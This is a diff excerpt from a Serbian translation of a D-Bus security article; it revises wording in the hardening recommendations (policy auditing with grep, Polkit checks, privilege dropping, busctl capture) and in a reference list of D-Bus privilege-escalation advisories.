 grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
 ```
 * Zahtevajte Polkit za opasne metode – čak i *root* proxy-ji treba da proslede PID *pozivaoca* funkciji `polkit_authority_check_authorization_sync()`, umesto sopstvenog PID-a.
-* Oduzmite privilegije dugotrajnim pomoćnim procesima (koristite `sd_pid_get_owner_uid()` za promenu namespace-a nakon povezivanja sa magistralom).
-* Ako ne možete da uklonite servis, barem ga *ograničite* na namensku Unix grupu i restriktivno definišite pristup u njegovoj XML policy datoteci.
-* Blue-team: snimite sistemsku magistralu pomoću `busctl capture > /var/log/dbus_$(date +%F).pcapng` i uvezite snimak u Wireshark radi detekcije anomalija.
+* Oduzmite privilegije dugotrajno aktivnim pomoćnim procesima (koristite `sd_pid_get_owner_uid()` za promenu namespace-a nakon povezivanja na bus).
+* Ako ne možete da uklonite servis, barem ga *ograničite* na namensku Unix grupu i restriktujte pristup u njegovoj XML policy datoteci.
+* Blue-team: snimite system bus pomoću `busctl capture > /var/log/dbus_$(date +%F).pcapng` i uvezite snimak u Wireshark radi detekcije anomalija.
 
 ---
 
 ## References
 
 - [1] [USBCreator D-Bus eskalacija privilegija u Ubuntu Desktop-u](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
-- [2] [CVE-2024-45752: D-Bus servis omogućava konfiguraciju bilo kom neprivilegovanom korisniku](https://github.com/PixlOne/logiops/issues/473)
+- [2] [CVE-2024-45752: D-Bus servis dozvoljava konfiguraciju svakom neprivilegovanom korisniku](https://github.com/PixlOne/logiops/issues/473)
 - [3] [dde-api-proxy: Zaobilaženje autentifikacije u Deepin D-Bus Proxy servisu (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
 - [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
 - [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
